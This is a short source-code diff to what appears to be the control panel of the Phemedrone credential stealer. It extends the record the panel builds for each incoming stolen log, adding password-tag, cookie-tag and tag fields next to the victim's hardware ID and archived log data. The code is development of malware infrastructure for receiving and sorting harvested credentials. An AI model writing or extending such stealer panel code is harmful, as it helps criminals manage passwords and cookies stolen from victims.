@@ -1,5 +1,4 @@
-﻿using System.Diagnostics;
-using System.Net;
+﻿using System.Net;
 using System.Net.Sockets;
 
 
@@ -13,6 +12,9 @@ namespace Phemedrone.Panel
         public string logInfo { get; set; }
         public string FileName { get; set; }
         public string HWID { get; set; }
+        public string PassTags { get; set; }
+        public string CookiesTags { get; set; }
+        public string Tag { get; set; }
         public byte[] LogBytes { get; set; }
     }
 
@@ -74,6 +76,9 @@ namespace Phemedrone.Panel
                         HWID = descriptions[4],
                         FileName = descriptions[5],
                         logInfo = $"{descriptions[6]}:{descriptions[7]}:{descriptions[8]}",
+                        PassTags = descriptions[9],
+                        CookiesTags = descriptions[10],
+                        Tag = descriptions[11],
                         LogBytes = archiveContent
                     });
                 }
